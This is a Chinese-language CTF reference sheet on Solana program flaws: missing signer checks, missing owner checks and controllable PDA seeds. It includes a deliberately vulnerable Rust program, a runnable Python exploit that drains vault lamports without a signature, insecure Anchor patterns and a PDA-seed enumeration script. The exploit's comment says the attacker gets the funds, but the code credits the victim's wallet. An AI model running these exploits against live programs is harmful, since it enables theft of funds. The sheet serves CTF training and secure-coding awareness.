---
title: Solana CTF 常见点（signer 校验缺失 / PDA / owner 校验）
category: blockchain
tags: [solana, signer, pda, 账户校验, ctf]
signals: [solana, anchor, sbf, 账户没有 is_signer, 缺少 owner 检查, pda 种子, invoke_signed, 可以传任意账户, solana 程序, rust 智能合约]
difficulty: medium
source: "Solana 官方文档 / BlockChomper solana-ctf / Cyfrin Updraft"
tools: [rust, anchor, solana-cli, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 题目是 Solana（Rust/Anchor），`process_instruction` 里接收 `AccountInfo` 数组。
- 有 `admin.key == expected` 之类的比较，但**没有** `admin.is_signer`。
- 有 `transfer`/`assign` 前没检查 `account.owner == program_id`。
- PDA（Program Derived Address）用种子生成，种子可控。
- 题面提示："你可以随便传账户"、"signer 未校验"、"任意账户"。
- 关键词：Solana、Anchor、signer、PDA、accounts、invoke。

## 二、原理

Solana 的运行时**不自动**做业务层校验，程序必须自己检查：

| 校验 | 作用 | 漏了会怎样 |
|---|---|---|
| `account.is_signer` | 该账户是否签名 | 攻击者伪造任意"管理员"账户 |
| `account.owner == program_id` | 账户数据归本程序所有 | 传入伪造的数据账户（含自己造的状态） |
| `account.key == expected_pda` | 地址是否为预期 PDA | 用别的账户骗过逻辑 |
| `lamports` 来源证明 | 转账来源 | 从别的账户转钱 |
| `has_one` / `constraint`（Anchor） | 关联校验 | 关联关系被绕过 |

Anchor 的 `Signer<'info>`、`#[account(owner = ...)]`、`seeds`/`bump` 会自动做这些校验；**原生 Rust 程序全部要手写**。CTF 里绝大多数 Solana 题就是"少了一行 `is_signer`"。

## 三、解题步骤

1. 读 `lib.rs`，列出每个 `AccountInfo` 参数及其校验。
2. 找缺失的 `is_signer` / `owner` / `key` 校验。
3. 用任意账户构造交易（Python `solana-py` + `solders`）。
4. 提交交易；链上状态满足判定（常见：`solved` 标志、PDA 数据里出现 flag）。

## 四、可直接运行的脚本

漏洞程序（原生 Rust，缺 signer 校验）：

```rust
// src/lib.rs（示意）
pub fn process(program_id: &Pubkey, accounts: &[AccountInfo], data: &[u8]) -> ProgramResult {
    let iter = &mut accounts.iter();
    let admin = next_account_info(iter)?;
    let vault = next_account_info(iter)?;
    // ✗ 缺少：if !admin.is_signer { return Err(ProgramError::MissingRequiredSignature); }
    let amount = u64::from_le_bytes(data[..8].try_into().unwrap());
    **vault.try_borrow_mut_lamports()? -= amount;
    **admin.try_borrow_mut_lamports()? += amount;
    Ok(())
}
```

利用（Python，把任意账户当 admin 抽钱）：

```python
from solana.rpc.api import Client
from solana.transaction import Transaction, AccountMeta
from solders.pubkey import Pubkey
from solders.instruction import Instruction
from solders.keypair import Keypair
import struct

RPC = "http://TARGET:8899"
c = Client(RPC)
program = Pubkey.from_string("PROGRAM_ID")
vault = Pubkey.from_string("VAULT_PDA")
me = Keypair()                       # 攻击者账户（不签名也能"当 admin"）
victim = Pubkey.from_string("ADMIN_WALLET")

data = struct.pack("<Q", 10_000)     # 抽 10000 lamports
ix = Instruction(
    program_id=program,
    accounts=[
        AccountMeta(pubkey=victim, is_signer=False, is_writable=True),  # ← 不签名
        AccountMeta(pubkey=vault, is_signer=False, is_writable=True),
    ],
    data=data,
)
tx = Transaction().add(ix)
tx.recent_blockhash = c.get_latest_blockhash().value.blockhash
tx.sign(me)
print(c.send_transaction(tx, me))
```

Anchor 版的"少校验"常见写法：

```rust
// 正确写法
#[derive(Accounts)]
pub struct SetAdmin<'info> {
    #[account(mut)]
    pub admin: Signer<'info>,                       // 自动校验 is_signer
    #[account(mut, has_one = admin)]
    pub config: Account<'info, Config>,             // 自动校验 owner / 反序列化
}

// 危险写法（CTF 常见）
#[derive(Accounts)]
pub struct Bad<'info> {
    /// CHECK: 只是标注，运行时不校验任何东西
    pub admin: UncheckedAccount<'info>,             // ← 不检查 signer！
    pub config: AccountInfo<'info>,                 // ← 不检查 owner！
}
```

PDA 种子可控的利用：

```rust
// 程序：
let (pda, _bump) = Pubkey::find_program_address(&[b"user", user_name.as_bytes()], program_id);
// 若 user_name 来自指令数据且违规允许为空 / 为 admin 的用户名，
// 就能拿到 admin 对应的 PDA 并冒充
```

```python
from solders.pubkey import Pubkey

pid = Pubkey.from_string("PROGRAM_ID")
addr, bump = Pubkey.find_program_address([b"user", b"admin"], pid)
print("PDA =", addr, "bump =", bump)

# 若程序把 user_name 直接当种子，可尝试用已知管理员的用户名拿同一个 PDA
for name in [b"admin", b"root", b"master"]:
    try:
        a, b = Pubkey.find_program_address([b"user", name], pid)
        print(name, "->", a)
    except Exception as e:
        print(name, "err", e)
```

## 五、常见坑 / 变体

- **`UncheckedAccount` / `/// CHECK:` 只是注释**：Anchor 不会做任何校验，必须手写 `constraint = admin.key == ...`。
- **`Signer` vs `AccountInfo`**：即使类型是 `Signer`，也要确认它对应的是哪个账户（可被换绑）。
- **owner 校验缺失**：攻击者可自建一个"数据账户"塞入 `solved = true` 的假状态。
- **PDA bump canonicalization**：`find_program_address` 与 `create_program_address` 若用不同 bump，会导致签名失效或换地址。
- **`invoke` vs `invoke_signed`**：需要 PDA 当 signer 时必须用 `invoke_signed` 并传 seeds。
- 变体：**重复账户攻击**（同一账户传两次，状态读写冲突）。
- 变体：**账本/租金**：`rent_exempt` 检查缺失可抽走租金。
- 变体：**Anchor 的 `init_if_needed` 重入**（`init_if_needed` 允许在已存在的账户上重复执行初始化逻辑，配合 CPI 可被利用）。
- 变体：**Solana 的 `signer` 校验缺失 + 任意 CPI**（程序可被当作中间人调用别的程序）。

## 六、参考来源

- [Solana 官方文档 - Accounts](https://docs.solana.com/developing/programming-model/accounts)
- [Solana 文档 - Program Derived Address (PDA)](https://solana.com/docs/core/pda)
- [BlockChomper/solana-ctf（Solana CTF 题目集）](https://github.com/BlockChomper/solana-ctf)
- [Cyfrin Updraft - Common Bugs: Missing Signer Check](https://updraft.cyfrin.io/courses/solana/common-bugs/missing-signer-check)
- [Anchor 文档 - Account 约束](https://www.anchor-lang.com/docs/account-constraints)
